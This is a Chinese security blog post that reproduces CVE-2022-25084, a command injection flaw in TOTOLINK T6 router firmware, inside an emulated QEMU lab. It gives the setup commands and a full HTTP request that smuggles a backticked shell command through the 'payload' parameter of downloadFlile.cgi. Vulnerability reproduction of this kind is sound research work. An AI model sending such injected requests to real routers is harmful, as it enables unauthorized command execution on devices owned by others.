---
title: CVE-2022-25084 TOTOLINK路由器任意命令执行漏洞复现
url: https://www.secpulse.com/archives/201543.html
source: 安全脉搏
date: 2023-06-09
fetch_date: 2025-10-04T11:46:50.077793
---

# CVE-2022-25084 TOTOLINK路由器任意命令执行漏洞复现

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# CVE-2022-25084 TOTOLINK路由器任意命令执行漏洞复现

[漏洞复现](https://www.secpulse.com/archives/category/articles/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

[第59号实验室](https://www.secpulse.com/newpage/author?author_id=49738)

2023-06-08

27,813

**漏洞简介**

TOTOLINK是一款无线路由品牌，TOTOLINK T6\_Firmware V5.9c.4085\_B20190428存在一个任意命令执行漏洞。

**影响版本**

TOTOLINK T6\_Firmware V5.9c.4085\_B20190428

**环境搭建**

访问

```
https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/190/ids/36.html
```

下载T6\_Firmware V5.9c.4085\_B20190428固件

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201543-1686203729.png)

固件下载成功后，执行

```
binwalk -Me TOTOLINK_C818NR_T6_IP04338_8197FN_SPI_16M128M_V5.9c.4085_B20190428_ALL.web --run-as=root
```

提取文件系统

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201543-1686203730.png)

进入提取的文件系统目录

执行

```
mkdir var/run && touch /var/run/lighttpd.pid
```

创建路由器启动环境所需的pid

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201543-1686203731.png)

执行

```
brctl addbr virbr2
ifconfig virbr2 192.168.6.1/24 up
tunctl -t tap2
ifconfig tap2 192.168.6.11/24 up
brctl addif virbr2 tap2
```

给路由器web服务创建一个虚拟网络环境

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201543-16862037311.png)

执行

```
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2 && wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta
```

下载镜像和虚拟磁盘环境，为搭建路由器web作前置准备

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201543-1686203732.png)

镜像和虚拟磁盘下载完毕后，执行

```
qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1" -netdev tap,id=tapnet,ifname=tap2,script=no -device rtl8139,netdev=tapnet -nographic
```

启动虚拟环境，虚拟环境启动后账号密码为root/root

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201543-16862037321.png)

登录虚拟环境后，执行

```
ifconfig eth0 192.168.6.10
```

配置虚拟环境网络

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201543-1686203733.png)

返回原始机器环境，执行

```
scp -r squashfs-root/ root@192.168.6.10:/root/
```

将文件系统拷贝至虚拟环境中

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201543-16862037331.png)

在虚拟环境中执行

```
chroot ./squashfs-root/ /bin/sh
./bin/lighttpd -f ./lighttp/lighttpd.conf -m ./lighttp/lib
```

启动路由器web服务

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201543-1686203734.png)

在原始机器环境中通过浏览器访问

http://192.168.6.15/login.asp

出现如图所示页面代表环境搭建成功

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201543-16862037341.png)

**漏洞复现**

该漏洞触发点位于

/cgi-bin/downloadFlile.cgi

构造如下数据包并请求

执行pwd命令并将命令结果写入../pwd.txt

```
GET /cgi-bin/downloadFlile.cgi?payload=`pwd>../pwd.txt` HTTP/1.1
Host: 192.168.6.10
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

浏览器访问

```
http://192.168.6.10/pwd.txt
```

如图所示，页面显示pwd命令结果

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-201543-1686203736.png)

**本文作者：[第59号实验室](newpage/author?author_id=49738)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/201543.html**](https://www.secpulse.com/archives/201543.html)

Tags: [CVE-2022-25084](https://www.secpulse.com/archives/tag/cve-2022-25084)、[TOTOLINK](https://www.secpulse.com/archives/tag/totolink)、[任意命令执行漏洞](https://www.secpulse.com/archives/tag/%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E)、[路由器](https://www.secpulse.com/archives/tag/%E8%B7%AF%E7%94%B1%E5%99%A8)

点赞：
3
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![物联网终端安全入门与实践之玩转物联网固件（下）DIY篇](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/03/1678764753295-300x231.png)

  物联网终端安全入门与实践之玩转物联网固件…](https://www.secpulse.com/archives/197408.html "详细阅读 物联网终端安全入门与实践之玩转物联网固件（下）DIY篇")
* [![浅谈路由器漏洞挖掘](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/03/16478487021-300x201.png)

  浅谈路由器漏洞挖掘](https://www.secpulse.com/archives/175346.html "详细阅读 浅谈路由器漏洞挖掘")
* [![复现｜路由器命令执行](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-174035-1646031698-300x128.png)

  复现｜路由器命令执行](https://www.secpulse.com/archives/174035.html "详细阅读 复现｜路由器命令执行")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/1a3b6dd6d88ce8675bf30bc03975bab1_ce6692cb75dd2998ff4d70b9690c28a5.jpeg)](https://www.secpulse.com/newpage/author?author_id=49738aaa) | [第59号实验室](https://www.secpulse.com/newpage/author?author_id=49738) | |
| 文章数：15 | 积分： 0 |
|  | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www...